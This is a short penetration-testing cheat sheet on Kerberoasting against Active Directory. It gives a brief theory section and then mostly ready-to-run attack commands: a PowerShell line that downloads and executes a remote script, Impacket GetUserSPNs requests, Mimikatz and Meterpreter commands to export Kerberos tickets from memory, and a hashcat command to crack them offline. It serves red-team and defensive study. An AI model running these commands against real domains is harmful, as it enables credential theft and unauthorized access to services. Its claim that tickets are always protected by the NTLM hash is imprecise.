# Kerberoasting

## Theory

This vulnerability enables an attacker to access arbitrary services by exploiting the weakness of service account password.

A domain user is able to request TGS from the DC on arbitrary services, even if it has no access on it. The TGS is protected by the NTLM hash of the account password. If the password is not strong, the hash could be easily break through bruteforce or wordlist.

## Method

* List the Service Principal Name (SPN):
  * GetUserSPNs Powershell script:&#x20;

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1')
```

* Impacket:&#x20;

```bash
./GetUserSPNs.py -dc-ip <DOMAINCONTROLLERIP> <DOMAIN>
/opt/Selection_Outils/SMB/impacket/examples/GetUserSPNs.py <DOMAIN>/<USER>:<PWD> -dc-ip <DC-IP>
```

*   List of Kerberos tickets that exist in memory:

    * On the CMD & PS: `klist`
    * Meterpreter: `load kiwi` then `kerberos_ticket_list`. Or `kiwi_cmd kerberos::list`
    * Mimikatz: `kerberos::list /export`
    * PowerSploit:&#x20;

    `Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'`
*   Request the SPN:

    * Impacket:&#x20;

    `./GetUserSPNs.py -dc-ip <DOMAINCONTROLLERIP> <DOMAIN>` the output is formatted for `JohnTheRipper` or `Hashcat`

    * Impacket for windows&#x20;

    `GetUserSPNs.exe -dc-ip <DOMAINCONTROLLERIP> <FULLDOMAINNAME>/<USER>:<PASSWORD>`

    * Mimikatz: `kerberos::ask /target:<SPN>`
* Break the ticket:
  * JohnTheRipper: WiP
  * Hashcat: `hashcat -m 13100 -a 0 <REQUESTSPNOUTPUT>`
